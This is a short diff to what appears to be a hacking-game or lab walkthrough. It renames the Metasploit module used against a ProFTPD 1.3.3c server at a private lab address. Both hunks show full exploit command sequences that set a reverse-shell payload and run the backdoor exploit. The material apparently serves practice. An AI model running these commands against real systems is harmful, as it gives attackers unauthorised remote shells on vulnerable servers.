@@ -120,7 +120,7 @@ Then `next`.
 
 **EP08 · The Default Bastion**
 ```
-use exploit/unix/ftp/proftpd_backdoor
+use exploit/unix/ftp/proftpd_133c_backdoor
 set RHOST 10.42.20.10
 set PAYLOAD cmd/unix/reverse
 exploit
@@ -237,7 +237,7 @@ cat gamma-recon.cap
 vulnscan --host 10.42.20.10
 searchsploit "ProFTPD 1.3.3c"
 next
-use exploit/unix/ftp/proftpd_backdoor
+use exploit/unix/ftp/proftpd_133c_backdoor
 set RHOST 10.42.20.10
 set PAYLOAD cmd/unix/reverse
 exploit
